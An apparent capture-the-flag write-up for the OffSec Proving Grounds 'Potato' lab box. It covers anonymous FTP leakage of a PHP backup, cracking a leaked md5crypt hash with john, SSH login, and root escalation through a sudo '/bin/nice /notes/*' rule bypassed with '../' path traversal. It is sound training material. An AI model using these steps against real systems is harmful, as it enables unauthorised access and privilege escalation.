---
title: "Potato"
description: "OffSec Proving Grounds Potato — anonymous FTP leaks a PHP backup file, a leaked /etc/passwd hash is cracked, and a scoped sudo rule on /bin/nice is abused via relative path traversal to get root."
tags:
  - Proving Grounds
  - OffSec
  - FTP
  - Sudo
  - Easy
---

# Potato

**Box info:** Difficulty: Easy · OS: Linux (Ubuntu 20.04) · Focus: Anonymous FTP file leakage, password cracking (`john`), sudo scoped-path-traversal privilege escalation.

Anonymous FTP access leaks a backed-up source file that reveals the web login flow's logic. The real path in, though, is a leaked `/etc/passwd`-style hash for a second account, cracked offline; a narrowly-scoped sudo rule on `/bin/nice` is then widened with a relative path trick to reach a root shell.

---

## 1. Reconnaissance (nmap)

```bash
nmap -p- -T4 -Pn -sC -sV --min-rate=1000 -oA nmap_full_scan 192.168.210.101
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Potato company
2112/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
```

Nmap's own FTP script already flags anonymous access **and** a readable `index.php.bak` sitting in the FTP root — a backup of the web app's login page.

## 2. Enumeration

### Anonymous FTP

```bash
ftp 192.168.210.101 -p 2112
Name: anonymous
mget *
```

```php
<?php
$pass= "potato"; //note Change this password regularly

if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    ...
```

The login check uses `strcmp()` directly on user-controlled input and is theoretically vulnerable to **PHP type juggling** (passing an array instead of a string makes `strcmp()` return `NULL`, which loosely equals `0`), and various brute-force/fuzzing attempts against this form were tried — none succeeded, so this path was a dead end rather than the real foothold.

### Content discovery

```bash
ffuf -u "http://192.168.210.101/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r
```

```text
admin                   [Status: 200]
```

![The /admin login page found by ffuf](images/potato/image.png)

Further poking around the admin panel and application eventually surfaces a leaked system file containing the full user list and a password hash:

```text
root:x:0:0:root:/root:/bin/bash
...
florianges:x:1000:1000:florianges:/home/florianges:/bin/bash
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
```

The `webadmin` account's `$1$` (md5crypt) hash is extracted and cracked offline:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```text
dragon           (?)
1g 0:00:00:00 DONE
```

## 3. Foothold — SSH with cracked credentials

```bash
ssh webadmin@192.168.210.101
# password: dragon
```

```text
webadmin@serv:~$ ls /home
florianges  webadmin
```

### User flag

```bash
cat /home/webadmin/local.txt
```

```text
<LOCAL_REDACTED>
```

## 4. Privilege escalation

```bash
sudo -l
```

```text
User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*
```

`webadmin` can run `/bin/nice` as root, but only against targets under `/notes/`. `nice` simply execs whatever is passed to it, so if the wildcard argument can be made to resolve to a path *outside* `/notes/` via `..` traversal while still textually starting with `/notes/`, the restriction is bypassed:

```bash
echo "/bin/bash -i" > /home/webadmin/root.sh
chmod +x /home/webadmin/root.sh
sudo /bin/nice /notes/../home/webadmin/root.sh
```

The first attempt (`/notes/../../../../home/webadmin/root.sh`) was rejected as `Permission denied` by sudo's path matching; relaxing it to a single `/notes/../home/webadmin/root.sh` resolves correctly and passes the wildcard check while landing exactly on the attacker-controlled script.

## 5. Root / proof.txt

```text
root@serv:/home/webadmin# whoami
root
root@serv:/home/webadmin# cat /root/proof.txt
```

```text
<PROOF_REDACTED>
```

---

## Takeaway

A `sudoers` wildcard scoped to a directory (`/notes/*`) is not the same as scoping to that directory's *contents* — relative path traversal inside the matched string (`/notes/../home/webadmin/root.sh`) still satisfies the glob while resolving anywhere on disk. Anonymous FTP and a leaked password hash got a foothold; sudo path-matching sloppiness is what turned it into root.
